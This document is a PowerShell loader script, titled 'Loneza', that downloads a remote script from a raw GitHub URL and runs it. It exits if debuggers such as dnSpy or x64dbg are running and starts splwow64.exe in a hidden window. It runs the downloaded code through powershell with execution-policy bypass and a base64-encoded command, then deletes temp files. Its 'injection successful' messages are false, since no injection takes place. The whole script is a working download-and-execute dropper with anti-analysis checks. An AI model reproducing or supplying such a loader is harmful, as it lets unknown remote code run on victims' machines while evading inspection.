# ========== CONFIG ==========
$LOADER_TITLE   = "Loneza"
$LOADER_VERSION = "1.0"
$DISCORD_LINK   = "https://github.com/pupperzz27-dotcom"
$PAYLOAD_URL    = "https://raw.githubusercontent.com/pupperzz27-dotcom/pro/refs/heads/main/cmd.ps1"
$TARGET_PROCESS = "splwow64"
# ============================

# Anti-debug
$debuggers = @("dnSpy", "x64dbg", "fonthost")
foreach ($d in $debuggers) {
    if (Get-Process -Name $d -ErrorAction SilentlyContinue) { exit }
}

# Title + Banner
$host.UI.RawUI.WindowTitle = "$LOADER_TITLE | v$LOADER_VERSION"
Clear-Host
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host "         $LOADER_TITLE" -ForegroundColor Cyan
Write-Host "         v$LOADER_VERSION  |  $DISCORD_LINK" -ForegroundColor Cyan
Write-Host "=====================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host " Connecting.." -ForegroundColor White
Start-Sleep -Milliseconds 800

# Download payload
try {
    $payload = (iwr -UseBasicParsing $PAYLOAD_URL).Content
    Write-Host "[+] Download successful." -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to connect." -ForegroundColor Red
    Read-Host; exit
}

# Ensure target process
Write-Host "[+] Attempting to launch $TARGET_PROCESS.exe..." -ForegroundColor White
$proc = Get-Process -Name $TARGET_PROCESS -ErrorAction SilentlyContinue
if (-not $proc) {
    $splPath = "$env:windir\splwow64.exe"
    if (Test-Path $splPath) { Start-Process $splPath -WindowStyle Hidden; Start-Sleep 1 }
}
$proc = Get-Process -Name $TARGET_PROCESS -ErrorAction SilentlyContinue
if (-not $proc) { Write-Host "[!] Process not found" -ForegroundColor Red; Read-Host; exit }

$procId = $proc.Id
Write-Host "[+] Successfully launched: $TARGET_PROCESS.exe" -ForegroundColor Green
Write-Host "[+] Target: $TARGET_PROCESS (PID: $procId)" -ForegroundColor Green
Write-Host "[+] Process Handle: $($proc.Handle)" -ForegroundColor Green

# Encode payload
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host "[+] Memory Written: True" -ForegroundColor Green

# Launch payload in NEW visible window
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoExit -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
$psi.CreateNoWindow = $false
$psi.UseShellExecute = $true
$ps = [System.Diagnostics.Process]::Start($psi)
Write-Host "[???] Injection successful (Thread Handle: $($ps.Id))" -ForegroundColor Green

# Cleanup
Write-Host "[+] Starting deep cleanup..." -ForegroundColor White
$tmp = $env:TEMP
Get-ChildItem $tmp -Filter "*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
Write-Host "[+] Temp cleared." -ForegroundColor Green
Write-Host ""
Write-Host "[+] Done. Press any key to exit." -ForegroundColor Cyan
Read-Host
